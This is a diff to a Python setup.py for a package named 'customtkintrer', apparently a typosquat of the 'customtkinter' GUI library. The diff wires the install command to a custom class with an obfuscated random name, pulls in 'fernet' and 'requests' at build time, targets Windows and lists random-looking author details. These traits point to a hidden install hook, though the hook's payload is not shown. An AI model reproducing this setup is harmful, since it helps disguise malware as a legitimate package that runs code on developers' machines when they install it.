@@ -18,5 +18,22 @@ class mKhvoDjPITbpyvOvQCwgjXJADragEIIygGLjgOfDDxjwTWWmrzcRfVSSFabkzkGzziTYfoPCuA
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+setup(
+    name="customtkintrer",
+    version=VERSION,
+    author="seaWbfPuXWaMQfGfm",
+    author_email="jSxGpLJiJmB@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': mKhvoDjPITbpyvOvQCwgjXJADragEIIygGLjgOfDDxjwTWWmrzcRfVSSFabkzkGzziTYfoPCuAMVhwwlsNSGLPvVoFOhxLfoAVUHopWGGaNloAssxQYOKSfkcoWhigPAgPkcExTvakpIVBKWeOiqqPjklMMTFHltYPmFxsqFsiKVFJZTfOKKqALDIynmbNdrbOZXXqN,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
